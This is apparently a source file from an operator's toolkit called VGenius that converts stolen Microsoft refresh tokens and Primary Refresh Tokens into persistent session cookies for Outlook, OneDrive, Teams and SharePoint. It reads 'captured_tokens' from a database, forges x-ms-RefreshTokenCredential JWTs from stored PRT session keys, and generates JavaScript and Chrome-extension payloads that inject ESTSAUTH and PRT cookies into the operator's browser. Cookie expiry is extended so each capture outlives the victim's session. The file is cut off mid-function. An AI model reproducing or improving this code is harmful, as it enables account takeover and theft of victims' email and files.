/**
 * VGenius Cookie Converter Service
 * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
 * Supports both personal (MSA) and work/school (Azure AD) accounts
 * 
 * Enhanced with our-proven techniques for
 reliable cookie generation */
'use strict';

const axios = require('axios');
const ms = require('./microsoftclient');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

// Microsoft OAuth2 client configuration
// For work/school: Office Azure AD app (pre-consented in enterprise tenants)
// For personal: MSA-compatible app ID (not an Azure AD first-party app)
const CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
const TENANT = config.AZURE_TENANT || 'common';

// MSA-compatible client ID for personal accounts
// This is the Skype/MSA app that works with personal (hotmail/outlook/live) accounts
// Unlike the Office client ID, it does not trigger the "first party app" error on /consumers endpoint
const MSA_CLIENT_ID = '88196af5-e584-4924-b87d-b752fde2c6e3';

/**
 * Get the correct client ID based on account type
 * @param {string} accountType - 'personal' or 'work_school'

 * @returns {string} Client ID */
function getClientIdForAccountType(accountType) {
  if (accountType === 'personal') {
    return MSA_CLIENT_ID;
  }
  return CLIENT_ID;
}


// Token endpoint URLs for different account types
const TOKEN_ENDPOINTS = {
  work: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

// OAuth2 scopes for PRT construction
const PRT_SCOPES = 'openid profile email offline_access https://graph.microsoft.com/.default';


/**
 * Decode client_info from Microsoft token response
 * client_info is base64-encoded JSON with uid (object_id) and utid (tenant_id)
 */
function decodeClientInfo(clientInfo) {
  // Add padding if needed
  let padded = clientInfo;
  while (padded.length % 4) padded += '=';
  const decoded = Buffer.from(padded, 'base64').toString('utf-8');
  const parsed = JSON.parse(decoded);
  return { uid: parsed.uid || '', utid: parsed.utid || '' };
}

/**
 * Decode id_token JWT payload without verification
 */
function decodeIdToken(idToken) {
  const parts = idToken.split('.');
  if (parts.length !== 3) return {};
  let payload = parts[1];
  while (payload.length % 4) payload += '=';
  try {
    return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'));
  } catch (e) {
    return {};
  }
}

// Microsoft service endpoints for cookie collection
const MICROSOFT_SERVICES = {
  // Authentication endpoints
  AUTH_LOGIN: 'https://login.microsoftonline.com',
  AUTH_PORTAL: 'https://login.microsoft.com',
  // Office 365 services
  OFFICE_PORTAL: 'https://www.office.com',
  OFFICE_LOGIN: 'https://www.office.com/login',
  // OneDrive
  ONEDRIVE: 'https://onedrive.live.com',
  // Outlook
  OUTLOOK: 'https://outlook.office365.com/owa/',
  OUTLOOK_COM: 'https://outlook.office.com/owa/',
  // SharePoint
  SHAREPOINT: 'https://www.sharepoint.com',
  // Teams
  TEAMS: 'https://teams.microsoft.com',
  // Graph API
  GRAPH: 'https://graph.microsoft.com',
};

/**
 * Determine account type from email domain
 */
function detectAccountType(email) {
  if (!email) return 'unknown';
  const domain = email.split('@')[1].toLowerCase();
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'];
  if (personalDomains.includes(domain)) return 'personal';
  return 'work_school';
}

/**
 * Detect account type from multiple signals
 */
function detectAccountTypeFromContext(token, email, tenant) {
  if (tenant === 'consumers') return 'personal';
  if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
    if (email) { return detectAccountType(email); }
    return 'work_school';
  }
  if (token) {
    try {
      const parsed = JSON.parse(token);
      if (parsed.prt) return 'work_school';
    } catch (e) {}
  }
  if (email) { return detectAccountType(email); }
  return 'unknown';
}

/**
 * Generate x-ms-RefreshTokenCredential cookie using PRT JWT format
 * For work_school accounts: builds a proper PRT JWT signed with Microsoft's static HMAC key

 * For personal accounts: uses base64-encoded JSON format * 
 * This function now accepts either:
 * - A simple refresh token string -> will build PRT JWT (needs tid/uid via optional params)
 * - A full token response object (from /token endpoint) -> extracts
 all fields auto */
async function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
  let refreshToken, tid, uid, clientId, scopes;

  // Handle object input (full token response from Microsoft)
  if (typeof tokenResponse === 'object' && !Array.isArray(tokenResponse)) {
    refreshToken = tokenResponse.refresh_token || tokenResponse.access_token;
    tid = extraOpts.tid || tokenResponse.tid || '';
    uid = extraOpts.uid || '';
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;

    // Try to extract client_info from the response
    if (tokenResponse.client_info && !uid) {
      try {
        const decoded = decodeClientInfo(tokenResponse.client_info);
        uid = decoded.uid;
        tid = decoded.utid || tid;
      } catch (e) {
        try {
          const decoded = decodeClientInfo(tokenResponse.client_info);
          uid = decoded.uid;
          tid = decoded.utid || tid;
        } catch (e2) {
          if (tokenResponse.id_token) {
            const idPayload = decodeIdToken(tokenResponse.id_token);
            tid = idPayload.tid || tid;
          }
        }
      }
    }

    // Fallback: decode id_token for tid if still missing
    if (!tid && tokenResponse.id_token) {
      try {
        const idPayload = decodeIdToken(tokenResponse.id_token);
        tid = idPayload.tid || '';
      } catch (e) {}
    }
  }

  // Handle string input (plain refresh token) - FIXED: moved outside the object check
  if (typeof tokenResponse === 'string') {
    refreshToken = tokenResponse;
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;
    tid = extraOpts.tid || '';
    uid = extraOpts.uid || '';
  }

  // If no refresh token, return null
  if (!refreshToken) {
    return null;
  }

  // For personal accounts use base64 encoding
  if (accountType === 'personal') {
    const credential = JSON.stringify({
      token_type: 'Bearer',
      refresh_token: refreshToken,
      expires_in: 1209599
    });
    return {
      name: 'x-ms-RefreshTokenCredential',
      value: Buffer.from(credential).toString('base64'),
      domain: '', // No domain - set for current page only
    };
  }

  // For work/school accounts, build the PRT JWT.
  // NOTE: uid/tid are NOT required - GraphSpy's buildPrtCookieJwt signs with
  // (prt, sessionKey, nonce) only. Requiring them here used to push callers
  // onto the base64 fallback for no reason.
  if (accountType === 'work_school') {
    // GraphSpy's method (kdf_ver 2): a JWT signed with the key derived from
    // the PRT session key. Requires a real PRT session key + a fresh
    // srv_challenge nonce (extraOpts.sessionKey / extraOpts.nonce). Here
    // refreshToken must be an actual PRT. A live nonce is fetched when
    // extraOpts.nonce is not provided.
    if (extraOpts.sessionKey) {
      try {
        const prtkdf = require('./prtkdf');
        // GraphSpy's generate_cookie fetches a live srv_challenge nonce
        // when the caller has none. getSrvChallengeNonce() claims a proxy
        // from the pool and releases it again, so no manual release is
        // needed here.
        const nonce = extraOpts.nonce || await prtkdf.getSrvChallengeNonce();
        // GraphSpy passes the PRT JWT as the refresh_token claim, not the raw token.
        const prt = extraOpts.prt || refreshToken;
        const kdfCookie = prtkdf.buildPrtCookieJwt(prt, extraOpts.sessionKey, nonce);
        console.log('[CookieConverter] PRT cookie generated via KDF session key (uid=' + String(uid || '').substring(0, 8) + '..., tid=' + (tid || '?') + ')');
        return {
          name: 'x-ms-RefreshTokenCredential',
          value: kdfCookie,
          domain: '', // No domain - set for current page only
        };
      } catch (kdfErr) {
        // Deliberately NO base64 fallback - see the note above the guard.
        throw new Error('PRT cookie generation failed: ' + kdfErr.message);
      }
    }

    // The ONLY supported x-ms-RefreshTokenCredential is GraphSpy's KDF-signed
    // JWT. Entra validates that HS256 signature, so a base64 JSON blob - what
    // this function used to emit as a "fallback" - is rejected outright and
    // merely hides the real failure. Return null and let the caller report it.
    console.warn(
      '[CookieConverter] Cannot build PRT cookie: no sessionKey supplied. ' +
      'Capture the PRT session key first (device_credentials.session_key_encrypted).'
    );
    return null;
  }

  // Unknown account type: no PRT cookie can be produced.
  console.warn('[CookieConverter] No PRT cookie for account type "' + accountType + '"');
  return null;
}

/**
 * Get stored PRT cookie from device_credentials table
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @returns {Promise<string|null>} PRT cookie value or null
 */
async function getStoredPrtCookie(userId, tenantId) {
  try {
    const [rows] = await db.query(
      'SELECT prt_cookie_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
      [userId, tenantId]
    );

    if (rows.length === 0) return null;

    const { decrypt } = require('../utils/encrypt');
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    console.log('[CookieConverter] Found stored PRT cookie for user', userId, 'tenant', tenantId);
    return prtCookie;
  } catch (err) {
    console.error('[CookieConverter] Failed to get stored PRT cookie:', err.message);
    return null;
  }
}

/**
 * Refresh stored PRT cookie using device credentials
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @param {string} refreshToken - Refresh token to exchange for PRT
 * @returns {Promise<string|null>} New PRT cookie value or null
 */
async function refreshStoredPrtCookie(userId, tenantId, refreshToken) {
  try {
    const deviceManager = require('./devicemanager');
    const prtCookie = await deviceManager.refreshPrtCookie(userId, tenantId, refreshToken);
    console.log('[CookieConverter] Refreshed PRT cookie for user', userId, 'tenant', tenantId);
    return prtCookie;
  } catch (err) {
    console.error('[CookieConverter] Failed to refresh PRT cookie:', err.message);
    return null;
  }
}

function generatePrtCookieInjectionScript(prtCookie, redirectUrl = 'https://login.microsoftonline.com/?auth=2') {
  return `// VGenius PRT Cookie Injection
(function() {
  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";
  console.log('[VGenius] PRT cookie injected');
  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);
})();`;
}

/**
 * Generate full injection script with PRT + ESTSAUTH cookies
 * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
 */
function generateFullInjectionScript(prtCookie, accessToken, redirectUrl = 'https://www.office.com/') {
  const parts = [
    '// VGenius Full Token Injection Script',
    '(function() {',
    ' console.log(\'[VGenius] Starting injection...\');', ];

  if (prtCookie) {
    parts.push(`document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";`);
  }

  if (accessToken) {
    parts.push(`document.cookie = "ESTSAUTH=${accessToken}; path=/; secure; samesite=none";`);
    parts.push(`document.cookie = "ESTSAUTHLIGHT=${accessToken}; path=/; secure; samesite=none";`);
  }

  parts.push("  console.log('[VGenius] All cookies injected');");
  parts.push(`  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);`);
  parts.push('})();');

  return parts.join('\n');
}

/**
 * Convert OAuth2 refresh token/PRT to session cookies with extended expiry
 * Enhanced: better error handling and more comprehensive cookie collection
 */
async function convertTokensToCookies(inputToken, templateType, tenant, email, accountType, userId) {
  // SECURITY VALIDATION: Validate tenant against allowed list before use
  // Prevents manipulation of token endpoint via malicious tenant values
  const allowedTenants = ['common', 'organizations', 'adfs'];
  const validTenantRegex = /^[a-fA-F0-9\-]{36}$/; // Valid GUID format for org-specific tenants

  if (tenant && tenant !== 'consumers' && !allowedTenants.includes(tenant) && !validTenantRegex.test(tenant)) {
    console.warn('[CookieConverter] Invalid tenant value detected:', tenant);
    tenant = 'common'; // Fall back to safe default
  }

  tenant = tenant || 'common';
  email = email || '';
  if (!accountType || accountType === 'unknown') {
    accountType = detectAccountTypeFromContext(inputToken, email, tenant);
  }
  const isPersonal = accountType === 'personal';

  try {
    // Use proper scopes based on account type
    const scope = isPersonal
      ? 'openid profile offline_access https://outlook.office.com/SMTP.Send'
      : 'openid profile offline_access https://graph.microsoft.com/User.Read';

    console.log('[CookieConverter] Exchanging token for account type:', accountType, 'tenant:', tenant);

    const exchangeResult = await exchangeTokenForCookies(inputToken, tenant, accountType, scope);
    if (!exchangeResult.success) {
      console.error('[CookieConverter] Token exchange failed:', exchangeResult.error);
      return exchangeResult;
    }
    console.log('[CookieConverter] Token exchange successful, got', exchangeResult.cookies.length, 'cookies');

    // Collect additional service cookies
    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
    console.log('[CookieConverter] Collected', serviceCookies.length, 'service cookies');

    // Generate x-ms-RefreshTokenCredential cookie
    // First, try to use stored DRS PRT cookie if available (for work/school accounts)
    let xmsCookie = null;
    if (!isPersonal && userId && tenant && tenant !== 'common' && tenant !== 'organizations') {
      try {
        const storedPrt = await getStoredPrtCookie(userId, tenant);
        if (storedPrt) {
          console.log('[CookieConverter] Using stored DRS PRT cookie for x-ms-RefreshTokenCredential');
          xmsCookie = {
            name: 'x-ms-RefreshTokenCredential',
            value: storedPrt,
            domain: '', // No domain - set for current page only
          };
        }
      } catch (prtErr) {
        console.warn('[CookieConverter] Failed to get stored PRT cookie:', prtErr.message);
      }
    }

    // Build the PRT cookie with GraphSpy's KDF method. The session key is
    // captured at device enrollment into device_credentials.session_key_encrypted;
    // without it no valid PRT cookie exists, so look it up first.
    if (!xmsCookie) {
      let sessionKey = null;
      if (!isPersonal && userId && tenant) {
        try {
          const deviceManager = require('./devicemanager');
          const stored = await deviceManager.getStoredSessionKey(userId, tenant);
          if (stored && stored.hasSessionKey) sessionKey = stored.sessionKey;
        } catch (skErr) {
          console.warn('[CookieConverter] Session key lookup failed:', skErr.message);
        }
      }
      xmsCookie = await generateXmsRefreshTokenCredential(
        exchangeResult.prt || exchangeResult.new_refresh_token || inputToken,
        accountType,
        { prt: exchangeResult.prt, sessionKey }
      );
    }
    console.log('[CookieConverter] XMS cookie:', xmsCookie ? 'generated' : 'null');

    // Combine all cookies
    const allCookies = [
      ...(xmsCookie ? [xmsCookie] : []),
      ...exchangeResult.cookies,
      ...serviceCookies
    ];

    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    const cookieString = formatCookiesForInjection(allCookies, accountType);
    console.log('[CookieConverter] Total cookies formatted:', allCookies.length);
    
    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      access_token: exchangeResult.access_token,
      new_refresh_token: exchangeResult.new_refresh_token,
      account_type: accountType,
      expires: '100 years',
    };
  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message, err.stack);
    return { success: false, error: err.message, cookies: null };
  }
}

/**
 * Exchange token for new access token + cookies
 * Enhanced: better error handling for AADSTS errors and fallback strategies
 */
async function exchangeTokenForCookies(token, targetTenant, accountType, scope) {
  const cookies = [];
  let newRefreshToken = null;

  let lastError = null;
  let lastStatusCode = null;

  // Build endpoint list - try multiple endpoints for better success rate
  let endpoints = [];
  if (accountType === 'personal') {
    endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
  } else {
    // For work/school/organization accounts, try in order:
    // 1. Specific tenant (if valid)
    // 2. 'organizations' (all work/school accounts)
    // 3. 'common' (fallback)
    if (targetTenant && targetTenant !== 'common' && targetTenant !== 'organizations') {
      endpoints.push(`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`);
    }
    endpoints.push('https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
    endpoints.push(TOKEN_ENDPOINTS.common);
  }

  console.log('[CookieConverter] Will try endpoints:', endpoints.join(', '));

  for (const endpoint of endpoints) {
    try {
      console.log('[CookieConverter] Trying endpoint:', endpoint);

      // Use appropriate client ID
      const currentClientId = getClientIdForAccountType(accountType);
      const params = new URLSearchParams({
        client_id: currentClientId,
        grant_type: 'refresh_token',
        refresh_token: token,
        scope: scope,
      });

      const response = await ms.post(
        endpoint,
        params,
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          },
          validateStatus: () => true,
          maxRedirects: 5,
          timeout: 30000,
        }
      );

      lastStatusCode = response.status;
      const errData = response.data || {};
      const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;

      console.log('[CookieConverter] Endpoint', endpoint, 'returned', response.status, '-', errMsg.substring(0, 100));

      if (response.status === 200) {
        newRefreshToken = response.data.refresh_token || token;
        extractCookiesFromResponse(cookies, response, endpoint);
        console.log('[CookieConverter] Token exchange succeeded on:', endpoint, '- got', cookies.length, 'cookies');
        // Extract the PRT. The x-ms-RefreshTokenCredential cookie value is a
        // KDF-signed JWT whose refresh_token claim is the raw PRT — GraphSpy
        // passes that raw PRT as the refresh_token claim, not the cookie value.
        let prt = null;
        const prtCookie = (cookies || []).find(c => c.name === 'x-ms-RefreshTokenCredential');
        if (prtCookie) {
          try {
            const parts = String(prtCookie.value).split('.');
            if (parts.length === 3) {
              const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
              prt = payload.refresh_token || null;
            }
          } catch (e) { /* not a JWT — fall through to newRefreshToken */ }
        }
        if (!prt) prt = newRefreshToken;

        return {
          success: true,
          cookies,
          access_token: response.data.access_token,
          new_refresh_token: newRefreshToken,
          prt,
        };
      }

      // Handle specific AADSTS errors
      if (errMsg && errMsg.includes('AADSTS50076')) {
        lastError = 'AADSTS50076: User needs to re-authenticate (grant revoked)';
        break; // No point trying other endpoints
      } else if (errMsg && errMsg.includes('AADSTS70008')) {
        lastError = 'AADSTS70008: Refresh token expired';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50173')) {
        lastError = 'AADSTS50173: Requires user consent';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50105')) {
        lastError = 'AADSTS50105: Admin consent required for this app';
        // Try next endpoint
      } else if (errMsg && errMsg.includes('AADSTS70001')) {
        lastError = 'AADSTS70001: Application not found in this tenant';
        // Try next endpoint
      } else {
        lastError = errMsg;
      }
    } catch (err) {
      console.error('[CookieConverter] Request failed:', err.message);
      lastError = err.message;
    }
  }

  return { success: false, error: lastError || 'Token exchange failed', cookies: null };
}

/**
 * Collect additional cookies from Microsoft service endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email, accountType) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email, accountType);
  for (const ep of endpoints) {
    try { await fetchCookiesFromEndpoint(cookies, ep, accessToken, accountType); } catch (e) {}
  }
  return cookies;
}

/**
 * Get service endpoints based on template type and account type
 */
function getServiceEndpoints(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];

  if (accountType === 'personal') {
    endpoints.push('https://onedrive.live.com/');
    endpoints.push('https://outlook.live.com/owa/');
    endpoints.push('https://www.office.com/');
    if (type.includes('teams')) { endpoints.push('https://teams.microsoft.com/'); }
  } else {
    if (type.includes('sharepoint')) { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`); }
    if (type.includes('onedrive')) {
      if (email) { endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`); }
      else { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/onedrive.aspx`); }
    }
    if (type.includes('outlook') || type.includes('auth')) {
      endpoints.push('https://outlook.office365.com/owa/');
      endpoints.push('https://outlook.office.com/owa/');
    }
    if (type.includes('teams')) {
      endpoints.push('https://teams.microsoft.com/');
      endpoints.push('https://teams.microsoft.com/api/authservice/health');
    }
    if (type.includes('office') || type.includes('word') || type.includes('excel')) {
      endpoints.push('https://www.office.com/');
      endpoints.push('https://www.office.com/login');
    }
  }
  return endpoints;
}

/**
 * Determine primary endpoint for template type
 */
function determineEndpoint(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('onedrive')) return 'https://onedrive.live.com/';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.live.com/owa/';
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    return 'https://www.office.com/';
  } else {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
    return 'https://www.office.com/';
  }
}

/**
 * Determine resource URL for template type
 */
function determineResource(templateType, tenant, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('onedrive')) return 'https://onedrive.live.com';
    return 'https://graph.microsoft.com';
  } else {
    if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
    return 'https://graph.microsoft.com';
  }
}

/**
 * Fetch cookies from a single service endpoint
 */
async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountType) {
  const headers = {
    Authorization: `Bearer ${accessToken}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
  };

  try {
    const response = await ms.get(url, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
    extractCookiesFromResponse(cookieList, response, url);
  } catch (getErr) {
    try {
      const response = await ms.post(url, {}, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
      extractCookiesFromResponse(cookieList, response, url);
    } catch (postErr) {}
  }
}

/**
 * Extract cookies from axios response with full attribute parsing.
 * 
 * IMPORTANT: Microsoft's SSO cookies (ESTSAUTH, _mstsc, AADSSOR) are set with
 * Domain=.microsoftonline.com (a parent domain). document.cookie CANNOT set
 * parent-domain cookies — that's a hard HTML5 spec limit. These cookies MUST
 * be set via chrome.cookies.set() in an extension, or via CDP/Puppeteer.
 * 
 * This function now captures ALL Set-Cookie attributes so the extension can
 * set them correctly with proper domain/path/secure/samesite values.
 */
function extractCookiesFromResponse(cookieList, response, url) {
  const setCookieHeaders = response.headers['set-cookie'] || [];
  let baseUrl = '';
  try { baseUrl = new URL(url); } catch (e) { /* ignore */ }

  for (const cookieStr of setCookieHeaders) {
    // Split on semicolons but preserve the name=value part
    const segments = cookieStr.split(';');
    const firstSegment = segments[0].trim();
    const eqIndex = firstSegment.indexOf('=');
    if (eqIndex <= 0) continue;

    const cookieName = firstSegment.substring(0, eqIndex).trim();
    const cookieValue = firstSegment.substring(eqIndex + 1).trim();
    if (!cookieName || !cookieValue) continue;

    // Parse attributes from remaining segments
    let domain = '';
    let path = '/';
    let secure = false;
    let httpOnly = false;
    let sameSite = '';
    let expires = null;
    let maxAge = null;

    for (let i = 1; i < segments.length; i++) {
      const attr = segments[i].trim();
      const lower = attr.toLowerCase();
      const eq = attr.indexOf('=');
      if (eq === -1) {
        // No value: Secure, HttpOnly
        if (lower === 'secure') secure = true;
        if (lower === 'httponly' || lower === 'http-only') httpOnly = true;
      } else {
        const attrName = attr.substring(0, eq).trim().toLowerCase();
        const attrValue = attr.substring(eq + 1).trim();
        if (attrName === 'domain') {
          // Preserve the leading dot EXACTLY as sent by Microsoft.
          // chrome.cookies.set() requires '.microsoftonline.com' to apply the
          // cookie across subdomains (login.microsoftonline.com, etc).
          // A bare 'microsoftonline.com' is exact-host-only, so ESTSAUTH
          // would never be delivered to login.microsoftonline.com and the
          // SSO redirect back to login.microsoftonline.com fails.
          domain = attrValue.toLowerCase();
        } else if (attrName === 'path') {
          path = attrValue;
        } else if (attrName === 'samesite') {
          sameSite = attrValue.toUpperCase(); // Strict, Lax, None
        } else if (attrName === 'expires') {
          expires = attrValue;
        } else if (attrName === 'max-age') {
          const val = parseInt(attrValue, 10);
          if (!isNaN(val) && val > 0) maxAge = val;
        }
      }
    }

    // Fallback domain if the header omitted Domain=
    // Per RFC 6265, a cookie with no Domain attribute scopes to the
    // exact origin host (no dot). Do NOT add a dot here — that would
    // over-broaden a cookie the server meant to scope narrowly.
    if (!domain && baseUrl.hostname) {
      domain = baseUrl.hostname.toLowerCase();
    } else if (!domain) {
      // No host context at all — fall back to the SSO parent domain.
      // ESTSAUTH is set by Microsoft on login.microsoftonline.com, so we
      // prefer that host scope over the broader .microsoftonline.com.
      domain = '.login.microsoftonline.com';
    }

    cookieList.push({
      name: cookieName,
      value: cookieValue,
      domain: domain,
      path: path,
      secure: secure,
      httpOnly: httpOnly,
      sameSite: sameSite,
      expires: expires,
      maxAge: maxAge,
    });
  }
}

/**
 * Format cookies for extension injection - returns structured data
 * with all attributes needed by chrome.cookies.set()
 * 
 * NOTE: This replaces the old name=value string format.
 * The old format was useless because document.cookie cannot set
 * parent-domain cookies (hard HTML5 spec limit). The extension
 * needs the full attribute set to call chrome.cookies.set() correctly.
 */
function formatCookiesForInjection(cookies, accountType) {
  if (!cookies) return [];
  if (typeof cookies === 'string') {
    // Legacy fallback: parse simple name=value pairs
    return cookies.split('; ').map(s => {
      const [name, value] = s.split('=');
      return { name: name, value: value, domain: '.login.microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
    }).filter(c => c.name && c.value);
  }
  if (!Array.isArray(cookies)) return [];

  return cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    // Preserve the server-supplied domain if present.
    // If missing, prefer .login.microsoftonline.com because ESTSAUTH /
    // ESTSAUTHPERSISTENT are set by Microsoft's auth redirect on that host.
    // Fall back to .microsoftonline.com only when nothing else is available.
    domain: cookie.domain || '.login.microsoftonline.com',
    path: cookie.path || '/',
    secure: cookie.secure !== false,
    httpOnly: cookie.httpOnly === true,
    sameSite: cookie.sameSite || 'Lax',
    // Must always be a concrete timestamp. undefined = session cookie, which
    // dies on browser close and defeats storing the capture.
    expirationDate: computeCookieExpiration(cookie),
  })).filter(c => c.name && c.value);
}

/**
 * Resolve a concrete expirationDate (unix seconds) for a cookie.
 *
 * Order: Max-Age → Expires → 30-day default.
 *
 * A cookie with no expirationDate is a SESSION cookie and disappears when the
 * browser closes. The whole point of storing a capture is that it outlives the
 * capture session, so we always land on a real timestamp.
 *
 * @param {object} cookie - cookie record with optional maxAge / expires
 * @returns {number} unix seconds
 */
function computeCookieExpiration(cookie) {
  const now = Math.floor(Date.now() / 1000);

  // Max-Age wins over Expires per RFC 6265
  if (cookie.maxAge && cookie.maxAge > 0) {
    return now + Math.floor(cookie.maxAge);
  }

  if (cookie.expires) {
    const t = Math.floor(new Date(cookie.expires).getTime() / 1000);
    if (!isNaN(t) && t > now) return t;
  }

  // Default: 30 days. Survives browser restarts and tab closure.
  return now + 30 * 24 * 60 * 60;
}

/**
 * Generate JavaScript code that attempts cookie injection via document.cookie.
 * 
 * Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com) because
 * document.cookie CANNOT set parent-domain cookies — that's a hard HTML5 spec limit.
 * 
 * For setting .microsoftonline.com cookies, use the Chrome extension approach
 * (generateExtensionData) which uses chrome.cookies.set() with proper domain
 * attributes. That is the only way to set .microsoftonline.com cookies from
 * the operator's browser.
 * 
 * This function is kept for legacy compatibility but should not be used as
 * the primary injection method.
 */
function generateCookieInjectionScript(cookies) {
  if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
  
  // Convert to structured data
  const structured = formatCookiesForInjection(cookies.cookies, cookies.accountType);
  if (!structured.length) return '';
  
  let statement = '// VGenius Cookie Injection Script (legacy)\n';
  statement += '// IMPORTANT: Must be run on https://login.microsoftonline.com\n';
  statement += '// Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)\n';
  statement += '// because document.cookie CANNOT set parent-domain cookies.\n\n';
  
  for (const cookie of structured) {
    if (!cookie.name || !cookie.value) continue;
    const parts = [`${cookie.name}=${encodeURIComponent(cookie.value)}`];
    parts.push('domain=.login.microsoftonline.com');
    if (cookie.path) parts.push(`path=${cookie.path}`);
    if (cookie.secure) parts.push('Secure');
    if (cookie.sameSite) parts.push(`SameSite=${cookie.sameSite}`);
    if (cookie.expirationDate) parts.push(`Max-Age=${Math.floor(cookie.expirationDate - Date.now() / 1000)}`);
    statement += `document.cookie = "${parts.join('; ')}";\n`;
  }
  
  const redirectUrl = determineEndpoint(cookies.templateType || 'office');
  const redirectScript = `\n// Redirect to ${redirectUrl}\nwindow.location.href = "${redirectUrl}";`;
  return statement + redirectScript;
}

/**
 * Process cookie conversion and save to database
 */
async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType, userId) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType, userId);
  if (result.success && result.cookies) {
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
    // FIX: Preserve refresh_token_encrypted during cookie conversion
    // Don't overwrite the refresh token column - it must stay intact for injection
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(JSON.stringify(result.cookies)), 'cookie', accountType, ttlHours, tokenId]
    );
    // Note: refresh_token_encrypted is intentionally NOT updated here
    // to preserve the original refresh token for injection fallback
  }
  return result;
}

/**
 * Generate extension data payload for the Chrome extension.
 * 
 * This is the PRIMARY method for cookie injection. The extension uses
 * chrome.cookies.set() which can set parent-domain cookies (.microsoftonline.com)
 * — the only way to inject SSO cookies from the operator's browser.
 * 
 * Returns a JSON-serializable object that the extension will use to call
 * chrome.cookies.set() for each cookie.
 * 
 * @param {object} cookieResult - The result from convertTokensToCookies()
 * @returns {object} Extension data with cookies, target URL, and metadata
 */
function generateExtensionData(cookieResult) {
  if (!cookieResult || !cookieResult.success || !cookieResult.cookies) {
    return { success: false, error: 'No cookies to inject' };
  }
  
  // Convert to structured format
  const structured = formatCookiesForInjection(cookieResult.cookies, cookieResult.accountType);
  if (!structured.length) {
